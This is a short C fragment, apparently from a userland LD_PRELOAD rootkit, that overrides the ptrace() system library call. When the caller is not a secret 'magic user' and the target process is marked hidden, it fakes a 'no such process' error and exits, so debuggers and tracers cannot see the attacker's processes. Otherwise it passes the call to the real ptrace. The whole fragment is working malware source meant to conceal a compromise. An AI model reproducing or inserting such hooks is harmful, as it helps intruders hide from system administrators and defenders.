long ptrace(void *request, pid_t pid, void *addr, void *data){
    if(!magicusr() && hidden_proc(pid)){
        errno = ESRCH;
        exit(-1);
    }
    hook(CPTRACE);
    return (long)call(CPTRACE, request, pid, addr, data);
}
